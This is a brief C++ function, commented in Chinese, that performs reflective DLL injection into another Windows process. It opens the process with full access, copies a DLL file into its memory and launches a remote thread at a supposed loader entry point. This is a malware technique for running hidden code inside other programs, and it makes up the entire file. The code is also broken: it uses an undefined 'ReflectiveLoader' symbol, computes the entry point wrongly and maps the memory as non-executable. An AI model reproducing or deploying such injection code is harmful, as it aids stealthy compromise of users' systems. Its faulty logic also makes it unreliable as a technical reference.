#include <windows.h>
#include <iostream>

void InjectReflectiveDLL(DWORD processId, const char* dllPath) {
    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process!" << std::endl;
        return;
    }

    // 读取 DLL 文件内容
    FILE* file = fopen(dllPath, "rb");
    if (file == NULL) {
        std::cerr << "Failed to open DLL file!" << std::endl;
        return;
    }
    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);

    BYTE* buffer = new BYTE[size];
    fread(buffer, 1, size, file);
    fclose(file);

    // 分配内存
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    //写入dll文件的内容到对方进程的内存中
    WriteProcessMemory(hProcess, remoteMemory, buffer, size, NULL);

    // 执行反射加载器
    LPVOID remoteLoader = (LPVOID)((BYTE*)remoteMemory + sizeof(ReflectiveLoader));

    //创建线程去执行加载器
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteLoader, remoteMemory, 0, NULL);

    // 清理
    delete[] buffer;
    CloseHandle(hProcess);
}
